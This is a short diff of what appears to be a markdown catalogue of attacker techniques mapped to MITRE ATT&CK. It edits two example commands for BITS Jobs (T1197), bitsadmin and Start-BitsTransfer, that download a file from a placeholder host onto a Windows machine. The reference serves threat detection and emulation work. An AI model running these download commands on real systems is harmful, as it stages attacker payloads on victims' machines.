@@ -351,8 +351,8 @@ Get-CimInstance win32_logicaldisk
 BITS Jobs [[T1197](https://attack.mitre.org/techniques/T1197/)]
 
 ```
-cmd.exe /c bitsadmin /transfer n hxxp[:]//<ip_address>:<port>/file.ext $public\Downloads\outfile.ext
-PowerShell "Start-BitsTransfer -Source hxxp://<domain>/pathto/file.ext -Destination C:\\Users\\pathtofile\\file.ext -transfertype download"
+cmd.exe /c bitsadmin /transfer n http[:]//<IP_address>:<port>/<file_name>.ext $public\Downloads\<output_file>.ext
+PowerShell "Start-BitsTransfer -Source hxxp://<domain>/pathto/<file_name>.ext -Destination C:\\Users\\pathtofile\\<output_file>.ext -transfertype download"
 ```
 <br>
 
